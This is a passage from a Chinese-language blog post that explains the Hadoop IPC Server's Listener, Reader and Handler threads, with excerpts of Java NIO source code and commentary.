</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="cm">/* RPC.java */</span>
</span><span class='line'><span class="cm">/** Construct a server for a protocol implementation instance listening on a</span>
</span><span class='line'><span class="cm"> * port and address, with a secret manager. */</span>
</span><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="n">Server</span> <span class="nf">getServer</span><span class="o">(</span><span class="kd">final</span> <span class="n">Object</span> <span class="n">instance</span><span class="o">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">bindAddress</span><span class="o">,</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">port</span><span class="o">,</span>
</span><span class='line'>        <span class="kd">final</span> <span class="kt">int</span> <span class="n">numHandlers</span><span class="o">,</span>
</span><span class='line'>        <span class="kd">final</span> <span class="kt">boolean</span> <span class="n">verbose</span><span class="o">,</span> <span class="n">Configuration</span> <span class="n">conf</span><span class="o">,</span>
</span><span class='line'>        <span class="n">SecretManager</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">TokenIdentifier</span><span class="o">&gt;</span> <span class="n">secretManager</span><span class="o">)</span>
</span><span class='line'><span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="k">new</span> <span class="nf">Server</span><span class="o">(</span><span class="n">instance</span><span class="o">,</span> <span class="n">conf</span><span class="o">,</span> <span class="n">bindAddress</span><span class="o">,</span> <span class="n">port</span><span class="o">,</span> <span class="n">numHandlers</span><span class="o">,</span> <span class="n">verbose</span><span class="o">,</span> <span class="n">secretManager</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">Server</span> <span class="kd">extends</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">hadoop</span><span class="o">.</span><span class="na">ipc</span><span class="o">.</span><span class="na">Server</span> <span class="o">{</span> <span class="c1">// RPC的一个静态内部类</span>
</span><span class='line'>    <span class="kd">public</span> <span class="nf">Server</span><span class="o">(</span><span class="n">Object</span> <span class="n">instance</span><span class="o">,</span> <span class="n">Configuration</span> <span class="n">conf</span><span class="o">,</span> <span class="n">String</span> <span class="n">bindAddress</span><span class="o">,</span>  <span class="kt">int</span> <span class="n">port</span><span class="o">,</span>
</span><span class='line'>            <span class="kt">int</span> <span class="n">numHandlers</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">verbose</span><span class="o">,</span>
</span><span class='line'>            <span class="n">SecretManager</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">TokenIdentifier</span><span class="o">&gt;</span> <span class="n">secretManager</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>        <span class="kd">super</span><span class="o">(</span><span class="n">bindAddress</span><span class="o">,</span> <span class="n">port</span><span class="o">,</span> <span class="n">Invocation</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">numHandlers</span><span class="o">,</span> <span class="n">conf</span><span class="o">,</span>
</span><span class='line'>                <span class="n">classNameBase</span><span class="o">(</span><span class="n">instance</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()),</span> <span class="n">secretManager</span><span class="o">);</span>
</span><span class='line'>        <span class="k">this</span><span class="o">.</span><span class="na">instance</span> <span class="o">=</span> <span class="n">instance</span><span class="o">;</span>
</span><span class='line'>        <span class="k">this</span><span class="o">.</span><span class="na">verbose</span> <span class="o">=</span> <span class="n">verbose</span><span class="o">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>最终建立的是org.apache.hadoop.ipc.Server的一个子类，这个类只是实现了父类的抽象方法<code>call()</code>，其他的功能都由父类提供了。因此我们主要专注org.apache.hadoop.ipc.Server类</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="cm">/* Server.java */</span>
</span><span class='line'><span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">Server</span> <span class="o">{</span>
</span><span class='line'>  <span class="kd">private</span> <span class="n">Listener</span> <span class="n">listener</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>  <span class="kd">private</span> <span class="n">Responder</span> <span class="n">responder</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>  <span class="kd">private</span> <span class="kt">int</span> <span class="n">numConnections</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
</span><span class='line'>  <span class="kd">private</span> <span class="n">Handler</span><span class="o">[]</span> <span class="n">handlers</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>  <span class="kd">private</span> <span class="n">BlockingQueue</span><span class="o">&lt;</span><span class="n">Call</span><span class="o">&gt;</span> <span class="n">callQueue</span><span class="o">;</span> <span class="c1">// queued calls</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/** Starts the service.  Must be called before any calls will be handled. */</span>
</span><span class='line'>  <span class="kd">public</span> <span class="kd">synchronized</span> <span class="kt">void</span> <span class="nf">start</span><span class="o">()</span> <span class="o">{</span>
</span><span class='line'>      <span class="n">responder</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
</span><span class='line'>      <span class="n">listener</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
</span><span class='line'>      <span class="n">handlers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Handler</span><span class="o">[</span><span class="n">handlerCount</span><span class="o">];</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">handlerCount</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'>          <span class="n">handlers</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Handler</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
</span><span class='line'>          <span class="n">handlers</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">start</span><span class="o">();</span>
</span><span class='line'>      <span class="o">}</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>这里就截取了比较重要的代码片段，其中包含这一节要主要介绍的Listener，Responder，Handler，它们就是Server中的3大组件。这三个类都继承了Thread，也就是说它们的每个实例都将是一个线程。下面分别来介绍这三大组件。</p>

<h3>Listener</h3>

<p>首先我们先来看一下Listener的一部分源码</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="cm">/* Server.java */</span>
</span><span class='line'><span class="cm">/** Listens on the socket. Creates jobs for the handler threads*/</span>
</span><span class='line'><span class="kd">private</span> <span class="kd">class</span> <span class="nc">Listener</span> <span class="kd">extends</span> <span class="n">Thread</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">private</span> <span class="n">ServerSocketChannel</span> <span class="n">acceptChannel</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span> <span class="c1">//the accept channel</span>
</span><span class='line'>    <span class="kd">private</span> <span class="n">Selector</span> <span class="n">selector</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span> <span class="c1">//the selector that we use for the server</span>
</span><span class='line'>    <span class="kd">private</span> <span class="n">Reader</span><span class="o">[]</span> <span class="n">readers</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>    <span class="c1">// omitted</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="nf">Listener</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">address</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InetSocketAddress</span><span class="o">(</span><span class="n">bindAddress</span><span class="o">,</span> <span class="n">port</span><span class="o">);</span>
</span><span class='line'>        <span class="c1">// Create a new server socket and set to non blocking mode</span>
</span><span class='line'>        <span class="n">acceptChannel</span> <span class="o">=</span> <span class="n">ServerSocketChannel</span><span class="o">.</span><span class="na">open</span><span class="o">();</span>
</span><span class='line'>        <span class="n">acceptChannel</span><span class="o">.</span><span class="na">configureBlocking</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// Bind the server socket to the local host and port</span>
</span><span class='line'>        <span class="n">bind</span><span class="o">(</span><span class="n">acceptChannel</span><span class="o">.</span><span class="na">socket</span><span class="o">(),</span> <span class="n">address</span><span class="o">,</span> <span class="n">backlogLength</span><span class="o">);</span>
</span><span class='line'>        <span class="n">port</span> <span class="o">=</span> <span class="n">acceptChannel</span><span class="o">.</span><span class="na">socket</span><span class="o">().</span><span class="na">getLocalPort</span><span class="o">();</span> <span class="c1">//Could be an ephemeral port</span>
</span><span class='line'>        <span class="c1">// create a selector;</span>
</span><span class='line'>        <span class="n">selector</span><span class="o">=</span> <span class="n">Selector</span><span class="o">.</span><span class="na">open</span><span class="o">();</span>
</span><span class='line'>        <span class="n">readers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Reader</span><span class="o">[</span><span class="n">readThreads</span><span class="o">];</span>
</span><span class='line'>        <span class="n">readPool</span> <span class="o">=</span> <span class="n">Executors</span><span class="o">.</span><span class="na">newFixedThreadPool</span><span class="o">(</span><span class="n">readThreads</span><span class="o">);</span>
</span><span class='line'>        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">readThreads</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">Selector</span> <span class="n">readSelector</span> <span class="o">=</span> <span class="n">Selector</span><span class="o">.</span><span class="na">open</span><span class="o">();</span>
</span><span class='line'>            <span class="n">Reader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Reader</span><span class="o">(</span><span class="n">readSelector</span><span class="o">);</span>
</span><span class='line'>            <span class="n">readers</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">reader</span><span class="o">;</span>
</span><span class='line'>            <span class="n">readPool</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="n">reader</span><span class="o">);</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// Register accepts on the server socket with the selector.</span>
</span><span class='line'>        <span class="n">acceptChannel</span><span class="o">.</span><span class="na">register</span><span class="o">(</span><span class="n">selector</span><span class="o">,</span> <span class="n">SelectionKey</span><span class="o">.</span><span class="na">OP_ACCEPT</span><span class="o">);</span>
</span><span class='line'>        <span class="k">this</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="s">&quot;IPC Server listener on &quot;</span> <span class="o">+</span> <span class="n">port</span><span class="o">);</span>
</span><span class='line'>        <span class="k">this</span><span class="o">.</span><span class="na">setDaemon</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">LOG</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="n">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">&quot;: starting&quot;</span><span class="o">);</span>
</span><span class='line'>        <span class="n">SERVER</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">Server</span><span class="o">.</span><span class="na">this</span><span class="o">);</span>
</span><span class='line'>        <span class="k">while</span> <span class="o">(</span><span class="n">running</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">SelectionKey</span> <span class="n">key</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>            <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>                <span class="n">selector</span><span class="o">.</span><span class="na">select</span><span class="o">();</span>
</span><span class='line'>                <span class="n">Iterator</span><span class="o">&lt;</span><span class="n">SelectionKey</span><span class="o">&gt;</span> <span class="n">iter</span> <span class="o">=</span> <span class="n">selector</span><span class="o">.</span><span class="na">selectedKeys</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span>
</span><span class='line'>                <span class="k">while</span> <span class="o">(</span><span class="n">iter</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
</span><span class='line'>                    <span class="n">key</span> <span class="o">=</span> <span class="n">iter</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
</span><span class='line'>                    <span class="n">iter</span><span class="o">.</span><span class="na">remove</span><span class="o">();</span>
</span><span class='line'>                    <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>                        <span class="k">if</span> <span class="o">(</span><span class="n">key</span><span class="o">.</span><span class="na">isValid</span><span class="o">())</span> <span class="o">{</span>
</span><span class='line'>                            <span class="k">if</span> <span class="o">(</span><span class="n">key</span><span class="o">.</span><span class="na">isAcceptable</span><span class="o">())</span>
</span><span class='line'>                                <span class="n">doAccept</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
</span><span class='line'>                        <span class="o">}</span>
</span><span class='line'>                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                    <span class="o">}</span>
</span><span class='line'>                <span class="n">key</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>              <span class="o">}</span>
</span><span class='line'>            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">OutOfMemoryError</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="c1">// omitted</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>        <span class="c1">// omitted</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">void</span> <span class="nf">doAccept</span><span class="o">(</span><span class="n">SelectionKey</span> <span class="n">key</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span>  <span class="n">OutOfMemoryError</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">Connection</span> <span class="n">c</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>        <span class="n">ServerSocketChannel</span> <span class="n">server</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServerSocketChannel</span><span class="o">)</span> <span class="n">key</span><span class="o">.</span><span class="na">channel</span><span class="o">();</span>
</span><span class='line'>        <span class="n">SocketChannel</span> <span class="n">channel</span><span class="o">;</span>
</span><span class='line'>        <span class="k">while</span> <span class="o">((</span><span class="n">channel</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="na">accept</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">channel</span><span class="o">.</span><span class="na">configureBlocking</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
</span><span class='line'>            <span class="n">channel</span><span class="o">.</span><span class="na">socket</span><span class="o">().</span><span class="na">setTcpNoDelay</span><span class="o">(</span><span class="n">tcpNoDelay</span><span class="o">);</span>
</span><span class='line'>            <span class="n">Reader</span> <span class="n">reader</span> <span class="o">=</span> <span class="n">getReader</span><span class="o">();</span> <span class="c1">// 为了让每个reader尽可能平均地分配到channel，目前采用的是round robin方法</span>
</span><span class='line'>            <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>                <span class="n">reader</span><span class="o">.</span><span class="na">startAdd</span><span class="o">();</span>
</span><span class='line'>                <span class="n">SelectionKey</span> <span class="n">readKey</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="na">registerChannel</span><span class="o">(</span><span class="n">channel</span><span class="o">);</span> <span class="c1">// 将这个channel交由reader来处理</span>
</span><span class='line'>                <span class="n">c</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Connection</span><span class="o">(</span><span class="n">readKey</span><span class="o">,</span> <span class="n">channel</span><span class="o">,</span> <span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">());</span>
</span><span class='line'>                <span class="n">readKey</span><span class="o">.</span><span class="na">attach</span><span class="o">(</span><span class="n">c</span><span class="o">);</span>
</span><span class='line'>                <span class="kd">synchronized</span> <span class="o">(</span><span class="n">connectionList</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                    <span class="n">connectionList</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">numConnections</span><span class="o">,</span> <span class="n">c</span><span class="o">);</span>
</span><span class='line'>                    <span class="n">numConnections</span><span class="o">++;</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>            <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
</span><span class='line'>                <span class="n">reader</span><span class="o">.</span><span class="na">finishAdd</span><span class="o">();</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Listener主要做的事就是处理客户端的连接请求，它在acceptChannel(相当于listening socket)上监听客户端的连接请求，然后创建一个新的channel(相当于connected socket)作为接下来该客户端和服务器的通讯通道，然后将这个channel分配到某个reader上，让其来处理后续的客户端请求。同时还创建了一个Connection来表示客户端和服务器建立起来的连接，这个类内部有channel的引用，因此其知道这个连接底层的channel(或者说socket)是什么。为了要完全理解上面的代码还需要知道的是Java NIO中的<a href="http://tutorials.jenkov.com/java-nio/selectors.html">Selector</a>。<br/>
我们现在知道真正获取(读取)客户端rpc请求的是Reader类，它实现了Runnable接口即作为一个线程运行，这个类在Listener中只有固定多的实例(可以通过配置文件修改)，因此需要一个reader处理多个客户端的请求，这个在Selector的帮助下将会很容易实现，Reader类中有一个readerSelector的实例来帮助reader处理请求。下面看一下Reader的部分源代码。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="cm">/* Server.java */</span>
</span><span class='line'><span class="kd">private</span> <span class="kd">class</span> <span class="nc">Reader</span> <span class="kd">implements</span> <span class="n">Runnable</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">private</span> <span class="n">Selector</span> <span class="n">readSelector</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
</span><span class='line'>        <span class="kd">synchronized</span> <span class="o">(</span><span class="k">this</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="k">while</span> <span class="o">(</span><span class="n">running</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="n">SelectionKey</span> <span class="n">key</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>                <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>                    <span class="c1">// 下面都是Selector的典型用法，关键是doRead()函数，这个函数会处理客户端传来的数据</span>
</span><span class='line'>                    <span class="n">readSelector</span><span class="o">.</span><span class="na">select</span><span class="o">();</span> <span class="c1">// 当有channel可读后返回</span>
</span><span class='line'>                    <span class="n">Iterator</span><span class="o">&lt;</span><span class="n">SelectionKey</span><span class="o">&gt;</span> <span class="n">iter</span> <span class="o">=</span> <span class="n">readSelector</span><span class="o">.</span><span class="na">selectedKeys</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span>
</span><span class='line'>                    <span class="k">while</span> <span class="o">(</span><span class="n">iter</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
</span><span class='line'>                        <span class="n">key</span> <span class="o">=</span> <span class="n">iter</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
</span><span class='line'>                        <span class="n">iter</span><span class="o">.</span><span class="na">remove</span><span class="o">();</span>
</span><span class='line'>                        <span class="k">if</span> <span class="o">(</span><span class="n">key</span><span class="o">.</span><span class="na">isValid</span><span class="o">())</span> <span class="o">{</span>
</span><span class='line'>                            <span class="k">if</span> <span class="o">(</span><span class="n">key</span><span class="o">.</span><span class="na">isReadable</span><span class="o">())</span> <span class="o">{</span>
</span><span class='line'>                                <span class="n">doRead</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
</span><span class='line'>                            <span class="o">}</span>
</span><span class='line'>                        <span class="o">}</span>
</span><span class='line'>                        <span class="n">key</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>                    <span class="o">}</span>
</span><span class='line'>                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                        <span class="c1">// omitted</span>
</span><span class='line'>                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                    <span class="n">LOG</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&quot;Error in Reader&quot;</span><span class="o">,</span> <span class="n">ex</span><span class="o">);</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">synchronized</span> <span class="n">SelectionKey</span> <span class="nf">registerChannel</span><span class="o">(</span><span class="n">SocketChannel</span> <span class="n">channel</span><span class="o">)</span>
</span><span class='line'>        <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>            <span class="k">return</span> <span class="n">channel</span><span class="o">.</span><span class="na">register</span><span class="o">(</span><span class="n">readSelector</span><span class="o">,</span> <span class="n">SelectionKey</span><span class="o">.</span><span class="na">OP_READ</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">doRead</span><span class="o">(</span><span class="n">SelectionKey</span> <span class="n">key</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">InterruptedException</span> <span class="o">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
</span><span class='line'>    <span class="c1">// 找出目前处理连接对应的Connection，上面提到过对于每一个已建立的连接都会生成一个Connection来表示</span>
</span><span class='line'>    <span class="c1">// 关于Connection类后面还会详细讨论</span>
</span><span class='line'>    <span class="n">Connection</span> <span class="n">c</span> <span class="o">=</span> <span class="o">(</span><span class="n">Connection</span><span class="o">)</span><span class="n">key</span><span class="o">.</span><span class="na">attachment</span><span class="o">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">count</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">readAndProcess</span><span class="o">();</span> <span class="c1">// 交给对应的Connection来处理</span>
</span><span class='line'>    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">ieo</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="c1">// omitted</span>
</span><span class='line'>    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">count</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="o">;</span> <span class="c1">//so that the (count &lt; 0) block is executed</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">count</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">closeConnection</span><span class="o">(</span><span class="n">c</span><span class="o">);</span>
</span><span class='line'>        <span class="n">c</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">c</span><span class="o">.</span><span class="na">setLastContact</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">());</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


